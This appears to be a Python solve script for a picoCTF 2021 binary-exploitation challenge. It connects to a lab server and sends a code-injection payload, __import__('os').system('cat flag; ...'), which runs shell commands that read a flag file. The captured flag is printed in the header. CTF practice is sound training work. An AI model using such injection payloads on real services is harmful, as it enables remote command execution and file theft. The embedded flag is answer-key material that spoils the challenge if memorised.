# 138 - What's your input?  (Binary Exploitation, picoCTF 2021)
# Flag: academy{v4lua4bl3_1npu7_6fd920cb}
# Write-up: ../../../writeups/binary-exploitation/138-what-s-your-input.md
# This is the script that produced the flag; historical variants are in archive/.
#
import sys, socket, time, re
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
HOST, PORT = "xebec.cylabacademy.net", 33466
try:
    s = socket.create_connection((HOST, PORT), timeout=12)
    s.settimeout(5)
    time.sleep(0.6)
    try:
        print("banner:", s.recv(4096).decode("utf-8", "replace")[:300])
    except Exception:
        pass
    s.sendall(b"2018\n")
    time.sleep(0.5)
    try:
        print("apres 2018:", s.recv(4096).decode("utf-8", "replace")[:300])
    except Exception:
        pass
    s.sendall(b"__import__('os').system('cat flag; cat ./flag; ls')\n")
    time.sleep(1.0)
    out = ""
    try:
        while True:
            chunk = s.recv(8192)
            if not chunk:
                break
            out += chunk.decode("utf-8", "replace")
    except Exception:
        pass
    print("=== SORTIE ===")
    print(out[:1500])
    m = re.search(r"(?:academy|picoCTF)\{[^}]*\}", out)
    if m:
        print("FLAG:", m.group(0))
    s.close()
except Exception as e:
    print("err", type(e).__name__, e)
